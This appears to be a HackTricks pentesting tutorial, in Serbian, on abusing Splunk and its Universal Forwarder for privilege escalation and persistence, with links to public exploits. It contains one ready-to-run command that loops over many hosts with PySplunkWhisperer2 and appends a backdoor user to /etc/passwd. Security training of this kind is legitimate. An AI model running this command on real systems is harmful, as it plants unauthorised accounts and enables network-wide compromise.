# Splunk LPE i Persistencija

{{#include ../../banners/hacktricks-training.md}}

Ako **enumerišete** mašinu **interno** ili **eksterno** i pronađete da **Splunk radi** (port 8090), ako srećom znate neke **validne kredencijale**, možete **iskoristiti Splunk servis** da **izvršite shell** kao korisnik koji pokreće Splunk. Ako ga pokreće root, možete eskalirati privilegije na root.

Takođe, ako ste **već root i Splunk servis ne sluša samo na localhost**, možete **ukrasti** **datoteku** sa **lozinkama** **iz** Splunk servisa i **provaliti** lozinke, ili **dodati nove** kredencijale. I održati persistenciju na hostu.

Na prvoj slici ispod možete videti kako izgleda Splunkd web stranica.

## Pregled Eksploatacije Splunk Universal Forwarder Agenta

Za dalje detalje proverite post [https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/](https://eapolsniper.github.io/2020/08/14/Abusing-Splunk-Forwarders-For-RCE-And-Persistence/). Ovo je samo sažetak:

**Pregled Eksploatacije:**
Eksploatacija koja cilja Splunk Universal Forwarder Agenta (UF) omogućava napadačima sa lozinkom agenta da izvrše proizvoljan kod na sistemima koji pokreću agenta, potencijalno kompromitujući celu mrežu.

**Ključne Tačke:**

- UF agent ne validira dolazne konekcije ili autentičnost koda, što ga čini ranjivim na neovlašćeno izvršavanje koda.
- Uobičajene metode sticanja lozinki uključuju pronalaženje u mrežnim direktorijumima, deljenju datoteka ili internim dokumentima.
- Uspešna eksploatacija može dovesti do pristupa na SISTEM ili root nivou na kompromitovanim hostovima, eksfiltraciji podataka i daljoj infiltraciji u mrežu.

**Izvršenje Eksploatacije:**

1. Napadač dobija lozinku UF agenta.
2. Koristi Splunk API za slanje komandi ili skripti agentima.
3. Moguće akcije uključuju ekstrakciju datoteka, manipulaciju korisničkim nalozima i kompromitaciju sistema.

**Uticaj:**

- Potpuna kompromitacija mreže sa SISTEM/root nivoom dozvola na svakom hostu.
- Potencijal za onemogućavanje logovanja kako bi se izbegla detekcija.
- Instalacija backdoora ili ransomware-a.

**Primer Komande za Eksploataciju:**
```bash
for i in `cat ip.txt`; do python PySplunkWhisperer2_remote.py --host $i --port 8089 --username admin --password "12345678" --payload "echo 'attacker007:x:1003:1003::/home/:/bin/bash' >> /etc/passwd" --lhost 192.168.42.51;done
```
**Iskoristive javne eksploatacije:**

- [https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2](https://github.com/cnotin/SplunkWhisperer2/tree/master/PySplunkWhisperer2)
- [https://www.exploit-db.com/exploits/46238](https://www.exploit-db.com/exploits/46238)
- [https://www.exploit-db.com/exploits/46487](https://www.exploit-db.com/exploits/46487)

## Zloupotreba Splunk upita

**Za više detalja pogledajte post [https://blog.hrncirik.net/cve-2023-46214-analysis](https://blog.hrncirik.net/cve-2023-46214-analysis)**

{{#include ../../banners/hacktricks-training.md}}
